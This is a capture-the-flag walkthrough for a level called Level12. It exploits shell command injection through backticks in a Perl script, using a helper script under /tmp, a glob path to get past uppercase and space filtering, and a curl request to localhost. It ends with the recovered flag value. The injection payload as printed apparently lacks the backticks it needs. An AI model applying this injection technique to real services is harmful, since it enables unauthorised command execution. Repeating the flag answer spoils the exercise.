# Level12

In Level12, you are provided with a Perl script named `./level12.pl` and nothing else. Upon examining the script, you determine that it functions similarly to the script found in `level04`. It sets up a simple server that waits for query parameters.

You need to exploit the following lines within the script:


$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
@output = `egrep "^$xx" /tmp/xd 2>&1`;


With `$xx` as your input, the first line converts all lowercase characters to uppercase, and the second line removes anything after the first space in the input.

To exploit this script, you need your input to be in all capital letters and contain no spaces. However, you can't directly use `x=$(getflag)` like in previous levels.

To get around this limitation, you create a script named `/tmp/SCRIPT` with the following content:


#!/bin/bash

getflag > /tmp/flag


Since `SCRIPT` is in uppercase, you won't encounter any issues with the case conversion. However, the directory name `tmp` is not in uppercase, so you run `/*/SCRIPT` instead. This notation will match any script fitting the `*` pattern.

You execute the following command (using single quotes to prevent the interpretation of `$`):


curl localhost:4646?x='/*/SCRIPT'


## The flag

The script is executed, and you can read the contents of `/tmp/flag` to obtain the Level12 flag:


cat /tmp/flag


This displays the Level12 flag:


g1qKMiRpXf53AWhDaU7FEkczr
